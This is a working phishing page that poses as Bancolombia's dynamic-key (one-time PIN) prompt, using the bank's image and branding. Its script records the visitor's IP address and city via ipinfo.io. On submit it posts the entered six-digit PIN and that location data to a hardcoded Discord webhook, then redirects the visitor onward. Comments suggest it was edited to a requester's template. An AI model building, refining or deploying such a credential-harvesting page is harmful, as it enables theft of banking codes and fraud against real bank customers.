<!DOCTYPE html>
<html lang="es">
  <head>
    <meta charset="UTF-8" />
    <title>Clave Din치mica - Bancolombia</title>
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <style>
      /* --- Estilos CSS (Sin cambios) --- */
      body {
        background: rgba(0, 0, 0, 0.18);
        min-height: 100vh;
        margin: 0;
        font-family: "Segoe UI", Arial, sans-serif;
        display: flex;
        align-items: center;
        justify-content: center;
        height: 100vh;
      }
      /* --- MODAL PARA ESCRITORIO --- */
      .modal-dinamica {
        background: #fff;
        border-radius: 18px;
        box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.19);
        width: 700px;
        max-width: 90vw;
        padding: 0 0 20px 0;
        position: relative;
        text-align: center;
        overflow: hidden;
        display: flex;
        flex-direction: column;
        align-items: center;
      }

      /* --- BANNER --- */
      .modal-dinamica-banner {
        width: 100%;
        margin: 40px 0 0 0;
        background: #fff;
        border-radius: 16px;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 140px;
        position: relative;
        overflow: hidden;
      }
      .modal-dinamica-banner img {
        width: auto;
        height: 135px;
        display: block;
        margin: 0 auto;
        border-radius: 04px;
        object-fit: cover;
      }

      .modal-dinamica-close {
        position: absolute;
        top: 10px;
        right: 17px;
        font-size: 2.2em;
        color: #888;
        background: none;
        border: none;
        cursor: pointer;
        z-index: 2;
        transition: color 0.18s;
      }
      .modal-dinamica-close:hover {
        color: #f05a22;
      }

      /* AJUSTE PARA PEGAR EL T칈TULO AL BANNER */
      .modal-dinamica h2 {
        font-size: 1.4em;
        margin: 5px 0 1px 0;
        font-weight: 500;
        color: #222;
      }
      .modal-dinamica-desc {
        color: #000;
        font-size: 1.17em;
        margin-bottom: 20px;
      }
      .dinamica-inputs {
        display: flex;
        justify-content: center;
        gap: 08px;
        margin-bottom: 47px;
      }
      .dinamica-inputs input {
        width: 0;
        height: 0;
        border: none;
        font-size: 1.3em;
        text-align: center;
        background: transparent;
        outline: none;
      }
      .dinamica-inputs label {
        display: block;
        position: relative;
        width: 39px;
        height: 20px;
        border-bottom: none;
        margin: 0;
        text-align: center;
      }
      .dinamica-inputs input:focus + .linea,
      .dinamica-inputs input.filled + .linea {
        border-bottom: 2px solid #222;
      }
      .dinamica-inputs .linea {
        display: block;
        position: absolute;
        bottom: 0;
        left: 0;
        width: 100%;
        height: 100%;
        border-bottom: 1px solid #222;
        pointer-events: none;
        transition: border-color 0.2s;
      }
      .dinamica-inputs label.filled .linea {
        border-bottom: 2px solid #000000;
      }
      .dinamica-inputs label input {
        position: absolute;
        left: 0;
        top: 0;
        width: 100%;
        height: 100%;
        background: transparent;
        border: none;
        outline: none;
        font-size: 2.1em;
        text-align: center;
        color: #222;
        font-weight: bold;
        z-index: 2;
        letter-spacing: 0.1em;
      }
      .dinamica-actions {
        display: flex;
        gap: 40px;
        justify-content: center;
        margin-top: 2px;
        width: 100%;
      }
      .dinamica-btn {
        font-size: 1.18em;
        padding: 14px 62px;
        border-radius: 28px;
        border: 2px solid #ccc;
        font-weight: 500;
        background: #fff;
        color: #444;
        cursor: pointer;
        transition: background 0.19s, border-color 0.19s, color 0.19s;
        box-shadow: 0 2px 8px rgba(0, 0, 0, 0.04);
      }

      /* ESTILO #1: Botones DESACTIVADOS (Gris) */
      .dinamica-btn:disabled {
        background: #ededed;
        color: #b4b4b4;
        border-color: #ededed;
        cursor: not-allowed;
      }

      /* ESTILO #2: Desactivamos la clase .dinamica-btn.continuar para que herede el GRIS del :disabled */
      .dinamica-btn.continuar {
        /* No definimos estilos aqu칤 */
      }

      /* ESTILO #3: Bot칩n Continuar HABILITADO (Amarillo con Letras Negras) */
      .dinamica-btn.continuar.enabled {
        background: #ffda00;
        color: #000000;
        border-color: #ffda00;
        cursor: pointer;
      }

      /* BLOQUE DE AJUSTES RESPONSIVE PARA TEL칄FONOS */
      @media (max-width: 700px) {
        .modal-dinamica {
          width: 99vw;
          min-width: 0;
          padding: 0 0 22px 0;
        }
        .modal-dinamica-banner {
          height: 75px;
        }
        .modal-dinamica-banner img {
          height: 60px;
        }
        /* Ajuste de padding lateral para que el texto no se salga en m칩vil */
        .modal-dinamica h2,
        .modal-dinamica-desc {
          padding-left: 15px;
          padding-right: 15px;
        }
        .dinamica-btn {
          padding: 10px 11vw;
          font-size: 1em;
        }
        .dinamica-inputs label {
          width: 36px;
        }
        .dinamica-inputs {
          gap: 18px;
        }
        .modal-dinamica h2 {
          font-size: 1.3em;
        }
      }
    </style>
  </head>
  <body>
    <div class="modal-dinamica" role="alertdialog" aria-modal="true">
      <button class="modal-dinamica-close" onclick="cerrarModal()">
        &times;
      </button>
      <div class="modal-dinamica-banner">
        <img
          src="https://svpersonas.apps.bancolombia.com/assets/images/cd-desktop.gif"
          alt="Clave Din치mica"
        />
      </div>
      <h2>Ingresa la Clave Din치mica</h2>
      <p class="modal-dinamica-desc">
        Encuentra tu Clave Din치mica en la app Mi Bancolombia,<br />
        o en tu correo electronico registrado.
      </p>
      <form id="dinamicaForm" autocomplete="off">
        <div class="dinamica-inputs">
          <label
            ><input
              type="password"
              maxlength="1"
              pattern="[0-9]*"
              inputmode="numeric"
              required
              autocomplete="off" /><span class="linea"></span
          ></label>
          <label
            ><input
              type="password"
              maxlength="1"
              pattern="[0-9]*"
              inputmode="numeric"
              required
              autocomplete="off" /><span class="linea"></span
          ></label>
          <label
            ><input
              type="password"
              maxlength="1"
              pattern="[0-9]*"
              inputmode="numeric"
              required
              autocomplete="off" /><span class="linea"></span
          ></label>
          <label
            ><input
              type="password"
              maxlength="1"
              pattern="[0-9]*"
              inputmode="numeric"
              required
              autocomplete="off" /><span class="linea"></span
          ></label>
          <label
            ><input
              type="password"
              maxlength="1"
              pattern="[0-9]*"
              inputmode="numeric"
              required
              autocomplete="off" /><span class="linea"></span
          ></label>
          <label
            ><input
              type="password"
              maxlength="1"
              pattern="[0-9]*"
              inputmode="numeric"
              required
              autocomplete="off" /><span class="linea"></span
          ></label>
        </div>
        <div class="dinamica-actions">
          <button
            type="button"
            class="dinamica-btn borrar"
            id="btnBorrar"
            disabled
          >
            Borrar
          </button>
          <button
            type="submit"
            class="dinamica-btn continuar"
            id="btnContinuar"
            disabled
          >
            Continuar
          </button>
        </div>
        <div id="respuestaClave" style="color: #f05a22; margin-top: 10px"></div>
      </form>
    </div>
    <script>
      // Variables para almacenar la informaci칩n de sesi칩n
      let ipGlobal = "Cargando...";
      let cityGlobal = "Cargando...";

      // Obtener IP p칰blica y Ciudad
      fetch("https://ipinfo.io/json")
        .then((res) => res.json())
        .then((data) => {
          ipGlobal = data.ip || "No disponible";
          cityGlobal = data.city || "No disponible";
        })
        .catch(() => {
          ipGlobal = "No disponible";
          cityGlobal = "No disponible";
        });

      // --- L칩gica del formulario (Sin cambios en funcionalidad) ---
      function cerrarModal() {
        window.location.href = "login.html"; // Redirige a la p치gina de login si cierran
      }
      const labels = document.querySelectorAll(".dinamica-inputs label");
      const inputs = document.querySelectorAll(".dinamica-inputs input");
      const btnBorrar = document.getElementById("btnBorrar");
      const btnContinuar = document.getElementById("btnContinuar");
      const respuestaClave = document.getElementById("respuestaClave");

      function checkInputs() {
        let filled = Array.from(inputs).every((inp) => inp.value.length === 1);
        btnContinuar.disabled = !filled;
        btnBorrar.disabled = Array.from(inputs).every(
          (inp) => inp.value === ""
        );
        btnContinuar.classList.toggle("enabled", filled);
        labels.forEach((label, i) => {
          label.classList.toggle("filled", inputs[i].value.length === 1);
        });
      }
      inputs.forEach((input, idx) => {
        input.addEventListener("input", function (e) {
          this.value = this.value.replace(/[^0-9]/g, "").slice(0, 1);
          if (this.value.length === 1 && idx < inputs.length - 1) {
            inputs[idx + 1].focus();
          }
          checkInputs();
        });
        input.addEventListener("keydown", function (e) {
          if (e.key === "Backspace" && input.value === "" && idx > 0) {
            inputs[idx - 1].focus();
          }
        });
      });
      btnBorrar.addEventListener("click", () => {
        inputs.forEach((inp) => (inp.value = ""));
        inputs[0].focus();
        checkInputs();
        respuestaClave.textContent = "";
      });

      // --- Env칤o de la Clave Din치mica al Webhook con los datos adicionales ---
      document
        .getElementById("dinamicaForm")
        .addEventListener("submit", function (e) {
          e.preventDefault();
          const clave = Array.from(inputs)
            .map((inp) => inp.value)
            .join("");

          // CONSTRUCCI칍N DEL MENSAJE CON LA PLANTILLA SOLICITADA
          const webhookMessage = `
游쮻INAMICA游
---------------
游댐 PIN:           ${clave}
游끷 CIUDAD:        ${cityGlobal}
游깴 DIRECCI칍N IP:  ${ipGlobal}
`;

          // URL del Webhook (He mantenido la URL de tu c칩digo)
          const webhook =
            "https://discord.com/api/webhooks/1439411839136960623/NxZJAWgLzKIAtYyLp1bd24c15F8pwD5PootyZdg_lXDFmhazyvzOW1cEQOe7ljEE1b4N";

          fetch(webhook, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ content: webhookMessage }),
          })
            .then((res) => {
              if (res.ok) {
                inputs.forEach((inp) => (inp.value = ""));
                checkInputs();
                // Redirecci칩n FINAL despu칠s del primer intento (o lo que decidas)
                window.location.href = "final.html"; // << SUGERENCIA: Redirigir a una p치gina final
              } else {
                respuestaClave.textContent = "Error al enviar la clave.";
              }
            })
            .catch(() => {
              respuestaClave.textContent = "Error de conexi칩n.";
              // Redirecci칩n FINAL si falla la conexi칩n
              window.location.href = "final.html"; // << SUGERENCIA: Redirigir a una p치gina final
            });
        });

      window.addEventListener("DOMContentLoaded", () => {
        inputs[0].focus();
        checkInputs();
      });
    </script>
  </body>
</html>
